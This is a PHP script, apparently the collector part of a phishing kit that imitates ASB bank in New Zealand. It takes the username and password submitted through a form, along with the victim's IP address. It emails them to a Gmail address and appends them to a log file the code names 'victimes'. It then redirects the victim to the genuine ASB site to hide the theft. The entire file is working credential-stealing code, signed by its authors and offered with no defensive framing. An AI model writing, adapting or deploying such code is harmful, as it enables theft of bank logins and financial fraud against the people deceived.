<?
$ip = getenv("REMOTE_ADDR");
$message .= "\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By TimSLake---------------------\n";
$send = "gary.hops90@gmail.com";
$subject = "ASB Error - ReZulTs";
$headers = "From: ThePunisherTN ASB<support@team.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 

$message_pp = "<hr size=\"3\" width=\"50%\" align=\"left\" noshade=\"noshade\" color=\"#006600\"><br />
<font color=\"red\">-----------------|Error //ThePunisherTN ASB Log-ICQ: 651491412|-----------------</font><br />
<br />
USERNAME : ".$_POST['username']." <br />
PASSWORD : ".$_POST['password']." <br />


ip: ".$ip."<br />

<font color=\"red\">-----------------|ThePunisherTN ASB Log-ICQ: 651491412|-----------------</font><br />";



$victimes = fopen("../ASB.html","a");
fwrite($victimes,$message_pp);
fclose($victimes);


header("Location: https://www.asb.co.nz");	  

?>


